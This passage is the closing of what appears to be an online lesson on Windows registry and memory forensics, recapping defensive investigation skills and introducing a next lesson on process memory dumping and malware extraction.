Detect USB-based data exfiltration\n- Apply NotPetya-level forensic investigation skills\n\nThat's **massive progress**.\n\nEvery memory dump you analyze from here on will reveal persistence, user activity, and attack artifacts others can't see. Deleted files? Registry tracks execution. Cleared logs? Registry records activity. Disk wiped? Memory has intact hives.\n\n**You're ready for the next challenge. Let's keep building your forensic arsenal.**\n\nNext lesson: **Process Memory Dumping and Malware Extraction** - where you'll extract suspicious processes identified through registry analysis and perform static malware analysis.\n\nSee you there, Registry Forensics Expert! 🔍🚀"
      }
    }
  ],
  "tags": []
}